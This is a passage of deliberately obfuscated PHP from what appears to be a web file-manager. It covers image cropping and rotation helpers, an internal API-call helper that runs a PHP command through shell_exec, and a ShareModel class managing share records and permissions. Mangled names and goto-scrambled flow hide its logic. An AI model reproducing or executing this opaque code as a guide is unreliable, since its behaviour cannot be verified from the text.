â¥œÂÛñ; EË‘ºª¶×Ô: } private function rotateDegree($A˜¿ó˜ˆÈŠ, $f©½ğé”‡) { if (!$A˜¿ó˜ˆÈŠ || $f©½ğé”‡ % 360 === 0 || !function_exists($_SERVER[Å¸ş][1872])) { return $A˜¿ó˜ˆÈŠ; } $Fœ©Ë¨Û®¥ = imageRotate($A˜¿ó˜ˆÈŠ, 360 - $f©½ğé”‡, 0); imageDestroy($A˜¿ó˜ˆÈŠ); return $Fœ©Ë¨Û®¥ ? $Fœ©Ë¨Û®¥ : $A˜¿ó˜ˆÈŠ; } function cut($bË‹†¤Àç¡, $a¹à´²È¿Î, $dÒËÁÔÈ³î) { goto CÛñ‘¿ŠÁ; CÛñ‘¿ŠÁ: $bÕĞò’Âã‚ = $a¹à´²È¿Î / $dÒËÁÔÈ³î; $cÀ†ÖìîĞê = $this->srcW / $this->srcH; if ($bÕĞò’Âã‚ <= $cÀ†ÖìîĞê) { $AÙ¬œŸÀóŠ = $dÒËÁÔÈ³î; $Eµ©ù«·» = $AÙ¬œŸÀóŠ * ($this->srcW / $this->srcH); } else { $Eµ©ù«·» = $a¹à´²È¿Î; $AÙ¬œŸÀóŠ = $Eµ©ù«·» * ($this->srcH / $this->srcW); } goto b‚“‚àÊÒ‰; b‚“‚àÊÒ‰: $cõòÛº‚‘² = $this->creatImage($this->im, $Eµ©ù«·», $AÙ¬œŸÀóŠ, 0, 0, 0, 0, $this->srcW, $this->srcH); $EÂ‘­ëÍÖ‚ = $this->creatImage($cõòÛº‚‘², $a¹à´²È¿Î, $dÒËÁÔÈ³î, 0, 0, ($Eµ©ù«·» - $a¹à´²È¿Î) / 2, ($AÙ¬œŸÀóŠ - $dÒËÁÔÈ³î) / 2, $a¹à´²È¿Î, $dÒËÁÔÈ³î); imageDestroy($cõòÛº‚‘²); goto CÚµÌøöõÔ; CÚµÌøöõÔ: return $this->echoImage($EÂ‘­ëÍÖ‚, $bË‹†¤Àç¡); goto BÍê¤¦†£; BÍê¤¦†£: } function backFill($CŒ°Âéã¾, $d£™àÁá³À, $dùãâñÅˆâ, $A²–àš­Ò¾ = false, $C“Á£­æ¤’ = 255, $cìé©éì÷¶ = 255, $EˆŞ»ÌŸ¬Ô = 255) { goto Cß Ë—”¢; Cß Ë—”¢: $dÀƒòÙ‚‰ = $d£™àÁá³À / $dùãâñÅˆâ; $Eß®¯ÓÆÙá = $this->srcW / $this->srcH; if ($dÀƒòÙ‚‰ <= $Eß®¯ÓÆÙá) { $b’½ßåßã = $d£™àÁá³À; $E»ÓõöôĞ = $b’½ßåßã * ($this->srcH / $this->srcW); } else { $E»ÓõöôĞ = $dùãâñÅˆâ; $b’½ßåßã = $E»ÓõöôĞ * ($this->srcW / $this->srcH); } goto dø ÷ôÀ; dø ÷ôÀ: if (function_exists($_SERVER[Å¸ş][1873])) { @($F¬Œ‰½Å”  = imageCreateTrueColor($d£™àÁá³À, $dùãâñÅˆâ)); if (!$F¬Œ‰½Å” ) { $F¬Œ‰½Å”  = imageCreate($d£™àÁá³À, $dùãâñÅˆâ); } } else { $F¬Œ‰½Å”  = imageCreate($d£™àÁá³À, $dùãâñÅˆâ); } $C ˆ’ßÊÅõ = ($dùãâñÅˆâ - $E»ÓõöôĞ) / 2; $EÆá…ô± Ò = imagecolorallocate($F¬Œ‰½Å” , $C“Á£­æ¤’, $cìé©éì÷¶, $EˆŞ»ÌŸ¬Ô); goto Bƒğ­æ±ƒ±; bÑÔ©°’: return $this->echoImage($F¬Œ‰½Å” , $CŒ°Âéã¾); goto Dì¬Â’äâŞ; Bƒğ­æ±ƒ±: if ($A²–àš­Ò¾) { $EÆá…ô± Ò = imageColorTransparent($F¬Œ‰½Å” , $EÆá…ô± Ò); $C ˆ’ßÊÅõ = $dùãâñÅˆâ - $E»ÓõöôĞ; } imageFilledRectangle($F¬Œ‰½Å” , 0, 0, $d£™àÁá³À, $dùãâñÅˆâ, $EÆá…ô± Ò); if ($this->srcW > $d£™àÁá³À || $this->srcH > $dùãâñÅˆâ) { $cÑŞŠïõÕ = $this->creatImage($this->im, $b’½ßåßã, $E»ÓõöôĞ, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($b’½ßåßã < $d£™àÁá³À) { imageCopy($F¬Œ‰½Å” , $cÑŞŠïõÕ, ($d£™àÁá³À - $b’½ßåßã) / 2, 0, 0, 0, $b’½ßåßã, $E»ÓõöôĞ); } else { if ($E»ÓõöôĞ < $dùãâñÅˆâ) { imageCopy($F¬Œ‰½Å” , $cÑŞŠïõÕ, 0, $C ˆ’ßÊÅõ, 0, 0, $b’½ßåßã, $E»ÓõöôĞ); } else { imageCopy($F¬Œ‰½Å” , $cÑŞŠïõÕ, 0, 0, 0, 0, $b’½ßåßã, $E»ÓõöôĞ); } } } else { imageCopyMerge($F¬Œ‰½Å” , $this->im, ($d£™àÁá³À - $b’½ßåßã) / 2, $C ˆ’ßÊÅõ, 0, 0, $b’½ßåßã, $E»ÓõöôĞ, 100); } goto bÑÔ©°’; Dì¬Â’äâŞ: } function creatImage($aî„¬½´Ô½, $eµò‘óŒŞ, $A­‘†‚·ÑÈ, $díù·±ÄÅó, $BÕ…İ¦áôğ, $D¸î‚­Çš¢, $fë®òË¾ÄÄ, $f÷áÙ¨„–, $D Ú–±ƒâÀ) { if (function_exists($_SERVER[Å¸ş][1873])) { @($eÌ„ÒÕª³ = ImageCreateTrueColor($eµò‘óŒŞ, $A­‘†‚·ÑÈ)); @imagealphablending($eÌ„ÒÕª³, !1); @imagesavealpha($eÌ„ÒÕª³, !0); if ($eÌ„ÒÕª³) { imageCopyResampled($eÌ„ÒÕª³, $aî„¬½´Ô½, $díù·±ÄÅó, $BÕ…İ¦áôğ, $D¸î‚­Çš¢, $fë®òË¾ÄÄ, $eµò‘óŒŞ, $A­‘†‚·ÑÈ, $f÷áÙ¨„–, $D Ú–±ƒâÀ); } else { $eÌ„ÒÕª³ = ImageCreate($eµò‘óŒŞ, $A­‘†‚·ÑÈ); imageCopyResized($eÌ„ÒÕª³, $aî„¬½´Ô½, $díù·±ÄÅó, $BÕ…İ¦áôğ, $D¸î‚­Çš¢, $fë®òË¾ÄÄ, $eµò‘óŒŞ, $A­‘†‚·ÑÈ, $f÷áÙ¨„–, $D Ú–±ƒâÀ); } } else { $eÌ„ÒÕª³ = ImageCreate($eµò‘óŒŞ, $A­‘†‚·ÑÈ); imageCopyResized($eÌ„ÒÕª³, $aî„¬½´Ô½, $díù·±ÄÅó, $BÕ…İ¦áôğ, $D¸î‚­Çš¢, $fë®òË¾ÄÄ, $eµò‘óŒŞ, $A­‘†‚·ÑÈ, $f÷áÙ¨„–, $D Ú–±ƒâÀ); } return $eÌ„ÒÕª³; } public function imgRotate($C˜ƒŸÖÒõÂ, $aŒÃ¯“ëÚŠ) { goto e­éÊƒö¼Á; d…î›÷×ÛÍ: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $e›ÕÉ­ó„à = imagegif($e‘ö¸Õ°Ê•, $C˜ƒŸÖÒõÂ); break; case IMAGETYPE_JPEG: $e›ÕÉ­ó„à = imagejpeg($e‘ö¸Õ°Ê•, $C˜ƒŸÖÒõÂ, 100); break; case IMAGETYPE_PNG: $e›ÕÉ­ó„à = imagePNG($e‘ö¸Õ°Ê•, $C˜ƒŸÖÒõÂ); break; default: break; } imageDestroy($e‘ö¸Õ°Ê•); imageDestroy($this->im); goto fí´ŠÎ´ˆ; fí´ŠÎ´ˆ: return $e›ÕÉ­ó„à; goto cã»ñè¶; e­éÊƒö¼Á: if (!$this->im || $aŒÃ¯“ëÚŠ % 360 === 0 || !function_exists($_SERVER[Å¸ş][1872])) { return !1; } $e‘ö¸Õ°Ê• = imageRotate($this->im, 360 - $aŒÃ¯“ëÚŠ, 0); $e›ÕÉ­ó„à = !1; goto d…î›÷×ÛÍ; cã»ñè¶: } function echoImage($eÜ‰˜¢“Åõ, $AÓÅ‹»¬ª‚) { goto FĞÑ¡­¹ù; FĞÑ¡­¹ù: $d¥–òºïˆ =& $_SERVER[Å¸ş]; if (!$eÜ‰˜¢“Åõ) { return !1; } ob_get_clean(); goto Aï‡—“®ùË; Dß¦ğáœ÷: imageDestroy($this->im); return $fÖ·ÎÙç‘¤; goto b˜Öáõ‹Ö; Aï‡—“®ùË: $fÖ·ÎÙç‘¤ = !1; switch ($this->echoType) { case $d¥–òºïˆ[1874]: $fÖ·ÎÙç‘¤ = imagePNG($eÜ‰˜¢“Åõ); break; case $d¥–òºïˆ[167]: $fÖ·ÎÙç‘¤ = imagePNG($eÜ‰˜¢“Åõ, $AÓÅ‹»¬ª‚); break; } imageDestroy($eÜ‰˜¢“Åõ); goto Dß¦ğáœ÷; b˜Öáõ‹Ö: } } goto EÇğà–‹§Ô; Fôš´™Œƒ: function ActionCall($Cä‘Å¢áÊò) { $d¤¦‘ã– = array_slice(func_get_args(), 1); return ActionApply($Cä‘Å¢áÊò, $d¤¦‘ã–); } function ActionCallApi($Bƒ÷´šÎïä, $dÄªÊ¿¦Ãœ = '') { goto c¬„öÚ–ëÑ; DÈìËğà‹ö: $fŒòå‹¹Š = Action($A¹íĞ˜Ö[19])->accessToken(); $Bƒ÷´šÎïä = str_replace($A¹íĞ˜Ö[5], $A¹íĞ˜Ö[4], $Bƒ÷´šÎïä) . $A¹íĞ˜Ö[20] . $fŒòå‹¹Š . $d—ÓõœŸôğ; $bïÂˆÄ—Œì = $A¹íĞ˜Ö[16]; goto DÅíÎ…›Ô; DÅíÎ…›Ô: $EËÂ¯ƒâ¹ = phpBinCommand(); if ($EËÂ¯ƒâ¹ && function_exists($A¹íĞ˜Ö[21])) { $f‹Ğ°Æ­¹ = $EËÂ¯ƒâ¹ . $A¹íĞ˜Ö[22] . BASIC_PATH . $A¹íĞ˜Ö[23] . escapeshellarg($Bƒ÷´šÎïä); $bïÂˆÄ—Œì = shell_exec($f‹Ğ°Æ­¹); } if (!$bïÂˆÄ—Œì) { $f»•ë÷×± = stream_context_create(array($A¹íĞ˜Ö[24] => array($A¹íĞ˜Ö[25] => 20, $A¹íĞ˜Ö[26] => $A¹íĞ˜Ö[27]))); $bïÂˆÄ—Œì = file_get_contents(APP_HOST . $A¹íĞ˜Ö[28] . $Bƒ÷´šÎïä, !1, $f»•ë÷×±); } goto eâ‹á¼ì…; eâ‹á¼ì…: $Fï®¬¿ù¨¯ = json_decode($bïÂˆÄ—Œì, !0); $dºÈ¿ºí„ = is_array($Fï®¬¿ù¨¯) ? $Fï®¬¿ù¨¯ : array($A¹íĞ˜Ö[29] => null, $A¹íĞ˜Ö[30] => $bïÂˆÄ—Œì); if (!$Fï®¬¿ù¨¯) { echo $bïÂˆÄ—Œì; } goto dèçá”‚İÊ; dèçá”‚İÊ: return $dºÈ¿ºí„; goto féáß„„¢; c¬„öÚ–ëÑ: $A¹íĞ˜Ö =& $_SERVER[ãˆÙà–ÃÙ]; $d—ÓõœŸôğ = $dÄªÊ¿¦Ãœ; if (is_array($dÄªÊ¿¦Ãœ)) { $d—ÓõœŸôğ = $A¹íĞ˜Ö[16]; foreach ($dÄªÊ¿¦Ãœ as $Fƒ§Ú¾ØÍ => $BÈÓ©»šÑŠ) { $BÈÓ©»šÑŠ = is_array($BÈÓ©»šÑŠ) ? json_encode($BÈÓ©»šÑŠ) : $BÈÓ©»šÑŠ; $BÈÓ©»šÑŠ = is_bool($BÈÓ©»šÑŠ) ? intval($BÈÓ©»šÑŠ) : $BÈÓ©»šÑŠ; $d—ÓõœŸôğ .= $A¹íĞ˜Ö[17] . $Fƒ§Ú¾ØÍ . $A¹íĞ˜Ö[18] . rawurlencode($BÈÓ©»šÑŠ); } } goto DÈìËğà‹ö; féáß„„¢: } function ActionCallHook($cÎˆ·˜Õó) { goto cØµ´á™ ï; f¬˜µâÈŞ²: $Dšêêğ´Æë = $f¤¬¼Ï™ï ? json_decode($f¤¬¼Ï™ï, !0) : $Dšêêğ´Æë; $GLOBALS[$fÕÄ…Š²‰İ[31]] = 0; return $Dšêêğ´Æë; goto D›óÓİÈ¯; B¹ÛÑ÷ÂÜ¼: $GLOBALS[$fÕÄ…Š²‰İ[31]] = 1; $Dšêêğ´Æë = ActionApply($cÎˆ·˜Õó, $Dˆ ‹´–‚); $f¤¬¼Ï™ï = ob_get_clean(); goto f¬˜µâÈŞ²; cØµ´á™ ï: $fÕÄ…Š²‰İ =& $_SERVER[ãˆÙà–ÃÙ]; ob_start(); $Dˆ ‹´–‚ = array_slice(func_get_args(), 1); goto B¹ÛÑ÷ÂÜ¼; D›óÓİÈ¯: } goto Fœå¤øœäØ; DŸš¼’¥ì‰: class ShareModel extends ModelBase { protected $tableName = "\163\x68\x61\162\145"; protected $dataAuto = array(array("\155\157\144\x69\146\x79\124\151\x6d\x65", "\x74\x69\x6d\145", "\151\156\x73\x65\x72\x74\54\x75\160\144\141\164\x65", "\146\165\156\143\164\x69\x6f\x6e"), array("\x63\x72\x65\141\x74\x65\x54\x69\x6d\145", "\x74\151\155\145", "\x69\156\x73\x65\162\x74", "\x66\165\x6e\x63\164\151\x6f\156"), array("\157\160\x74\151\157\156\163", '', "\x69\156\163\145\162\x74\x2c\x75\160\x64\141\x74\x65\x2c\x73\145\x6c\x65\143\164", "\152\x73\x6f\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($dâæÂÛÔ) { $eÃ–¦·–Ú =& $_SERVER[Å¸ş]; $DÕÉ×‘°óÜ = isset($dâæÂÛÔ[0]) ? $dâæÂÛÔ[0] : !1; return array($eÃ–¦·–Ú[2230] => array(USER_ID, $eÃ–¦·–Ú[2231]), $eÃ–¦·–Ú[2179] => array($DÕÉ×‘°óÜ, $eÃ–¦·–Ú[2232])); } protected function listSimple() { $dŒÂÀ×ô´‹ = array($_SERVER[Å¸ş][1436] => USER_ID); $FñºÒ”Ù° = $this->field($this->fieldList)->where($dŒÂÀ×ô´‹)->select(); return $FñºÒ”Ù° ? $FñºÒ”Ù° : array(); } protected function getInfo($bƒœîòã‹Ø, $a‘Ìº¹ˆº¿ = false) { $e¢è“«¡ªÇ =& $_SERVER[Å¸ş]; if ($a‘Ìº¹ˆº¿) { return $this->_getShareInfo(array($e¢è“«¡ªÇ[441] => $bƒœîòã‹Ø)); } $Aé¾æ­¢…… = $this->cacheFunctionGet($e¢è“«¡ªÇ[2233], $bƒœîòã‹Ø); return $Aé¾æ­¢……; } public function getInfoByHash($AäÕôñÏŒ) { return $this->_getShareInfo(array($_SERVER[Å¸ş][443] => $AäÕôñÏŒ)); } public function getInfoByPath($dÅğ’Ü¬½º) { $DöÕÁêª„ó =& $_SERVER[Å¸ş]; $aÃ—ïĞìĞÔ = array($DöÕÁêª„ó[1436] => USER_ID, $DöÕÁêª„ó[369] => $dÅğ’Ü¬½º); return $this->_getShareInfo($aÃ—ïĞìĞÔ); } public function getInfoBySourcePath($CÚñÌÀ„¬Ó) { $Dê„­¥Ò±İ =& $_SERVER[Å¸ş]; $E¬‹â††Á¯ = array($Dê„­¥Ò±İ[1436] => USER_ID, $Dê„­¥Ò±İ[1017] => $CÚñÌÀ„¬Ó); return $this->_getShareInfo($E¬‹â††Á¯); } private function _getShareInfo($C˜áñğõİ§) { goto e²ØŒæñŠù; E•—Éß¿äÒ: if ($Dó©‡ÒŒßÌ[$c¤ŸŸÄ®â‚[369]] == $c¤ŸŸÄ®â‚[470]) { $Dó©‡ÒŒßÌ[$c¤ŸŸÄ®â‚[391]] = IO::info($Dó©‡ÒŒßÌ[$c¤ŸŸÄ®â‚[1017]]); } else { $Dó©‡ÒŒßÌ[$c¤ŸŸÄ®â‚[391]] = Model($c¤ŸŸÄ®â‚[1115])->pathInfo($Dó©‡ÒŒßÌ[$c¤ŸŸÄ®â‚[369]]); } $Dó©‡ÒŒßÌ[$c¤ŸŸÄ®â‚[2235]] = $B¾èğ·Ë’; return $Dó©‡ÒŒßÌ; goto C¤Ìòİë²¤; C©ÜŸÊİÙÃ: $C˜áñğõİ§ = array($c¤ŸŸÄ®â‚[441] => $Dó©‡ÒŒßÌ[$c¤ŸŸÄ®â‚[441]]); $DŸ¢ñİ‚Åá = $c¤ŸŸÄ®â‚[2234]; $B¾èğ·Ë’ = Model($c¤ŸŸÄ®â‚[539])->order($c¤ŸŸÄ®â‚[367])->field($DŸ¢ñİ‚Åá)->where($C˜áñğõİ§)->select(); goto E•—Éß¿äÒ; e²ØŒæñŠù: $c¤ŸŸÄ®â‚ =& $_SERVER[Å¸ş]; $Dó©‡ÒŒßÌ = $this->where($C˜áñğõİ§)->find(); if (!$Dó©‡ÒŒßÌ) { return !1; } goto C©ÜŸÊİÙÃ; C¤Ìòİë²¤: } protected function getInfoAuth($B‘•ÉøŞ×) { $cßÃÎÍî ‚ =& $_SERVER[Å¸ş]; $FÑÁáËÓÉ = $this->getInfo($B‘•ÉøŞ×); $FÑÁáËÓÉ[$cßÃÎÍî ‚[376]] = Model($cßÃÎÍî ‚[456])->authMake($FÑÁáËÓÉ[$cßÃÎÍî ‚[2235]]); return $FÑÁáËÓÉ; } protected function listData($a¸ß›Áµš„ = null, $dğ ĞÃš¬¿ = 300) { $B¶ä‹ŒàªÛ =& $_SERVER[Å¸ş]; $FîëšÎÒÖ¸ = array(array($B¶ä‹ŒàªÛ[446] => array($B¶ä‹ŒàªÛ[923], 0), $B¶ä‹ŒàªÛ[448] => array($B¶ä‹ŒàªÛ[923], 0), $B¶ä‹ŒàªÛ[2236] => $B¶ä‹ŒàªÛ[2193])); if ($a¸ß›Áµš„ == $B¶ä‹ŒàªÛ[1874]) { $FîëšÎÒÖ¸ = array($B¶ä‹ŒàªÛ[446] => 1); } else { if ($a¸ß›Áµš„ == $B¶ä‹ŒàªÛ[1006]) { $FîëšÎÒÖ¸ = array($B¶ä‹ŒàªÛ[448] => 1); } } $FîëšÎÒÖ¸[$B¶ä‹ŒàªÛ[1436]] = USER_ID; $DÀÆ¡ö“Ü‰ = $this->where($FîëšÎÒÖ¸)->selectPage($dğ ĞÃš¬¿); return $DÀÆ¡ö“Ü‰; } protected function listToMe($Dêñí†µ = 300) { goto Câó†ÖåÕ; EÄîĞÎÙõù: $aÒŠÑÖ×²ó = $this->field($Eª ÀŸìÂ)->where($F¡ß¨è•±„)->select(); foreach ($aÒŠÑÖ×²ó as $A¤ßÆÌÅæò => &$E‹Ü ÄË°) { $E‹Ü ÄË°[$c‡ÔËŠ¹¢[2235]] = $aÏÀèö¶ö[$E‹Ü ÄË°[$c‡ÔËŠ¹¢[441]]]; } unset($E‹Ü ÄË°); goto F§³×²˜­ö; Câó†ÖåÕ: $c‡ÔËŠ¹¢ =& $_SERVER[Å¸ş]; $fã‰·›Òó‚ = Model($c‡ÔËŠ¹¢[2237])->userGroupParents(USER_ID); $F¡ß¨è•±„ = array($c‡ÔËŠ¹¢[523] => SourceModel::TYPE_USER, $c‡ÔËŠ¹¢[458] => USER_ID); goto EèÆñ§ºØ; E¸¨÷ŠÉ: if (!$aÏÀèö¶ö) { return $e‘ºÊ˜øî™; } $Eª ÀŸìÂ = $c‡ÔËŠ¹¢[2238]; $F¡ß¨è•±„ = array($c‡ÔËŠ¹¢[441] => array($c‡ÔËŠ¹¢[384], array_keys($aÏÀèö¶ö))); goto EÄîĞÎÙõù; EèÆñ§ºØ: if ($fã‰·›Òó‚) { $F¡ß¨è•±„ = array(array($c‡ÔËŠ¹¢[523] => SourceModel::TYPE_USER, $c‡ÔËŠ¹¢[458] => USER_ID), array($c‡ÔËŠ¹¢[523] => SourceModel::TYPE_GROUP, $c‡ÔËŠ¹¢[458] => array($c‡ÔËŠ¹¢[7], $fã‰·›Òó‚)), $c‡ÔËŠ¹¢[2236] => $c‡ÔËŠ¹¢[2193]); } $e‘ºÊ˜øî™ = Model($c‡ÔËŠ¹¢[539])->where($F¡ß¨è•±„)->selectPage($Dêñí†µ); $aÏÀèö¶ö = array_to_keyvalue_group($e‘ºÊ˜øî™[$c‡ÔËŠ¹¢[354]], $c‡ÔËŠ¹¢[441]); goto E¸¨÷ŠÉ; F§³×²˜­ö: $A»¦‹šù˜· = array($c‡ÔËŠ¹¢[2239] => $aÒŠÑÖ×²ó, $c‡ÔËŠ¹¢[2240] => $e‘ºÊ˜øî™[$c‡ÔËŠ¹¢[351]]); return $A»¦‹šù˜·; goto F¡‚ê’”˜; F¡‚ê’”˜: } protected function shareAdd($bÆºòê¸šÈ, $cğ¶êÌ°‚µ) { $B”Ğ¿ÆáŠÑ =& $_SERVER[Å¸ş]; $eñËì‡å– = $this->_addShareData($bÆºòê¸šÈ, $cğ¶êÌ°‚µ); if (!empty($cğ¶êÌ°‚µ[$B”Ğ¿ÆáŠÑ[2241]])) { $this->_shareAuthSet($eñËì‡å–, $cğ¶êÌ°‚µ[$B”Ğ¿ÆáŠÑ[2241]]); } $this->shareEventAdd($bÆºòê¸šÈ, $cğ¶êÌ°‚µ, $B”Ğ¿ÆáŠÑ[1009]); return $eñËì‡å–; } private function shareEventAdd($A›£îéØ„Û, $DÈÉõ‚¦¸, $e¤¸‘‡Ò© = "\x61\x64\x64") { goto FæğŒ¥ºê; FæğŒ¥ºê: $D­Î¿Ú¦ÔÙ =& $_SERVER[Å¸ş]; if ($e¤¸‘‡Ò© == $D­Î¿Ú¦ÔÙ[1009]) { if ($DÈÉõ‚¦¸[$D­Î¿Ú¦ÔÙ[446]] == $D­Î¿Ú¦ÔÙ[83]) { Model($D­Î¿Ú¦ÔÙ[507])->eventShare($A›£îéØ„Û, $D­Î¿Ú¦ÔÙ[2242]); } if ($DÈÉõ‚¦¸[$D­Î¿Ú¦ÔÙ[448]] == $D­Î¿Ú¦ÔÙ[83]) { Model($D­Î¿Ú¦ÔÙ[507])->eventShare($A›£îéØ„Û, $D­Î¿Ú¦ÔÙ[2243]); } return; } $b†´ñÒ°ø˜ = $this->getInfoByPath($A›£îéØ„Û); goto B¶Ô¹Öò¾œ; B¶Ô¹Öò¾œ: $EÃäÊ…©Œ = $D­Î¿Ú¦ÔÙ[2244]; if ($b†´ñÒ°ø˜[$D­Î¿Ú¦ÔÙ[446]] == $D­Î¿Ú¦ÔÙ[470] && $DÈÉõ‚¦¸[$D­Î¿Ú¦ÔÙ[446]] == $D­Î¿Ú¦ÔÙ[83]) { $EÃäÊ…©Œ = $D­Î¿Ú¦ÔÙ[2242]; } if ($b†´ñÒ°ø˜[$D­Î¿Ú¦ÔÙ[446]] == $D­Î¿Ú¦ÔÙ[83] && $DÈÉõ‚¦¸[$D­Î¿Ú¦ÔÙ[446]] == $D­Î¿Ú¦ÔÙ[470]) { $EÃäÊ…©Œ = $D­Î¿Ú¦ÔÙ[2245]; } goto eºŠ‡’Ã°; eºŠ‡’Ã°: if ($b†´ñÒ°ø˜[$D­Î¿Ú¦ÔÙ[448]] == $D­Î¿Ú¦ÔÙ[470] && $DÈÉõ‚¦¸[$D­Î¿Ú¦ÔÙ[448]] == $D­Î¿Ú¦ÔÙ[83]) { $EÃäÊ…©Œ = $D­Î¿Ú¦ÔÙ[2243]; } if ($b†´ñÒ°ø˜[$D­Î¿Ú¦ÔÙ[448]] == $D­Î¿Ú¦ÔÙ[83] && $DÈÉõ‚¦¸[$D­Î¿Ú¦ÔÙ[448]] == $D­Î¿Ú¦ÔÙ[470]) { $EÃäÊ…©Œ = $D­Î¿Ú¦ÔÙ[2246]; } Model($D­Î¿Ú¦ÔÙ[507])->eventShare($A›£îéØ„Û, $EÃäÊ…©Œ); goto c‹‡Æ Ø¢¶; c‹‡Æ Ø¢¶: return; goto F’ÃßŸ“í§; F’ÃßŸ“í§: } private function _addShareData($d¤øÑ¸», $B†µ–†÷³ˆ = array()) { goto f³Ñ¶²è±¼; f³Ñ¶²è±¼: $b÷©†Ï¼óË =& $_SERVER[Å¸ş]; $e…ôô¸ßğ = array($b÷©†Ï¼óË[383] => $d¤øÑ¸», $b÷©†Ï¼óË[1427] => USER_ID); if ($d¤øÑ¸» == 0) { $e…ôô¸ßğ = array($b÷©†Ï¼óË[2247] => $B†µ–†÷³ˆ[$b÷©†Ï¼óË[1017]], $b÷©†Ï¼óË[1427] => USER_ID); } goto cƒ‘©—ë„ó; Fø‡Ğ•…Àô: $dšÒÆ¨§ŠÕ = $this->add($E¶Â¡¸õ); $fÈõ‚Ã˜Ç® = array($b÷©†Ï¼óË[443] => short_id($dšÒÆ¨§ŠÕ)); $this->where(array($b÷©†Ï¼óË[440] => $dšÒÆ¨§ŠÕ))->save($fÈõ‚Ã˜Ç®); goto dÌË§’æ; fàí½¡: $E¶Â¡¸õ = array($b÷©†Ï¼óË[1427] => USER_ID, $b÷©†Ï¼óË[383] => $d¤øÑ¸», $b÷©†Ï¼óË[1340] => $b÷©†Ï¼óË[33], $b÷©†Ï¼óË[446] => 0, $b÷©†Ï¼óË[448] => 0, $b÷©†Ï¼óË[1017] => $b÷©†Ï¼óË[33], $b÷©†Ï¼óË[295] => $b÷©†Ï¼óË[33], $b÷©†Ï¼óË[799] => $b÷©†Ï¼óË[33], $b÷©†Ï¼óË[2248] => 0, $b÷©†Ï¼óË[2249] => 0, $b÷©†Ï¼óË[449] => 0, $b÷©†Ï¼óË[450] => $b÷©†Ï¼óË[33], $b÷©†Ï¼óË[443] => $b÷©†Ï¼óË[33]); $C÷Í—ĞÓ— = explode($b÷©†Ï¼óË[47], $b÷©†Ï¼óË[2250]); foreach ($C÷Í—ĞÓ— as $d¤Äí­´é¹) { if (!isset($B†µ–†÷³ˆ[$d¤Äí­´é¹])) { continue; } $E¶Â¡¸õ[$d¤Äí­´é¹] = $B†µ–†÷³ˆ[$d¤Äí­´é¹]; } goto Fø‡Ğ•…Àô; dÌË§’æ: return $dšÒÆ¨§ŠÕ; goto døÉ»Ï¾Ê; cƒ‘©—ë„ó: if ($Fê©ñ‡Û¢Ø = $this->where($e…ôô¸ßğ)->find()) { return $Fê©ñ‡Û¢Ø[$b÷©†Ï¼óË[441]]; } if ($d¤øÑ¸» == 0) { $a×š†ìÖá™ = array($b÷©†Ï¼óË[28] => get_path_this($B†µ–†÷³ˆ[$b÷©†Ï¼óË[75]])); } else { $a×š†ìÖá™ = Model($b÷©†Ï¼óË[755])->sourceInfo($d¤øÑ¸»); if (!$a×š†ìÖá™) { return !1; } } if (!$B†µ–†÷³ˆ[$b÷©†Ï¼óË[1340]]) { $B†µ–†÷³ˆ[$b÷©†Ï¼óË[1340]] = $a×š†ìÖá™[$b÷©†Ï¼óË[28]]; } goto fàí½¡; døÉ»Ï¾Ê: } private function _shareAuthSet($Fùó¤ÕÄ‰š, $CÉ†ˆì‹) { goto aÖµÑäóİ­; a«¬Ìùó·¡: return $EÌğ±Ç¶ÂÂ->addAll($AÍ‰›ƒ˜³Œ, array(), !0); goto C…Ğ•œÜ¯Á; bõ»Û¹‚²: $EÌğ±Ç¶ÂÂ->where(array($cÚ¼è¸ã“á[441] => $Fùó¤ÕÄ‰š))->delete(); $AÍ‰›ƒ˜³Œ = array(); foreach ($CÉ†ˆì‹ as $eäî·„Â÷£) { $D¿ÜØŞ¦’ = SourceModel::TYPE_USER; if ($eäî·„Â÷£[$cÚ¼è¸ã“á[371]] == SourceModel::TYPE_GROUP) { $D¿ÜØŞ¦’ = SourceModel::TYPE_GROUP; } $f°î÷‰Å Î = array($cÚ¼è¸ã“á[441] => $Fùó¤ÕÄ‰š, $cÚ¼è¸ã“á[371] => $D¿ÜØŞ¦’, $cÚ¼è¸ã“á[458] => intval($eäî·„Â÷£[$cÚ¼è¸ã“á[458]]), $cÚ¼è¸ã“á[2252] => 0, $cÚ¼è¸ã“á[2253] => -1); if ($eäî·„Â÷£[$cÚ¼è¸ã“á[2252]]) { $f°î÷‰Å Î[$cÚ¼è¸ã“á[2252]] = $eäî·„Â÷£[$cÚ¼è¸ã“á[2252]]; } else { if ($eäî·„Â÷£[$cÚ¼è¸ã“á[2253]]) { $f°î÷‰Å Î[$cÚ¼è¸ã“á[2253]] = $eäî·„Â÷£[$cÚ¼è¸ã“á[2253]]; } } $AÍ‰›ƒ˜³Œ[] = $f°î÷‰Å Î; } goto a«¬Ìùó·¡; aÖµÑäóİ­: $cÚ¼è¸ã“á =& $_SERVER[Å¸ş]; if (!is_array($CÉ†ˆì‹)) { return !1; } $EÌğ±Ç¶ÂÂ = Model($cÚ¼è¸ã“á[2251]); goto bõ»Û¹‚²; C…Ğ•œÜ¯Á: } public function numViewAdd($E´­•Ç‰–†) { $Fñˆ‡……‡ =& $_SERVER[Å¸ş]; $cß³Ç¸æ…å = array($Fñˆ‡……‡[440] => $E´­•Ç‰–†); $this->where($cß³Ç¸æ…å)->setAdd($Fñˆ‡……‡[2248]); } public function numDownloadAdd($CîÓåÏòÈæ) { $B†ĞİİÖ¿ƒ =& $_SERVER[Å¸ş]; $cÙõªàÕ¥ä = array($B†ĞİİÖ¿ƒ[440] => $CîÓåÏòÈæ); $this->where($cÙõªàÕ¥ä)->setAdd($B†ĞİİÖ¿ƒ[2249]); } protected function shareEdit($d»ùÎèŠÓ, $D©óÈÊôß¾) { goto FŒ‡á¶õ¦Ë; FŒ‡á¶õ¦Ë: $FÅ—°®ÙÍÀ =& $_SERVER[Å¸ş]; $aƒôÄâÂÀä = $this->getInfo($d»ùÎèŠÓ); if (!$aƒôÄâÂÀä) { return !1; } goto a¢ƒ¢İã¾…; bŠÄŒÕ„ë: foreach ($fó¼ˆÍ‡š as $e–õƒÑ£§¾) { if (!array_key_exists($e–õƒÑ£§¾, $D©óÈÊôß¾)) { continue; } $d±¸‚”ÎÉ[$e–õƒÑ£§¾] = $D©óÈÊôß¾[$e–õƒÑ£§¾]; } $this->shareEventAdd($aƒôÄâÂÀä[$FÅ—°®ÙÍÀ[369]], $D©óÈÊôß¾, $FÅ—°®ÙÍÀ[2075]); 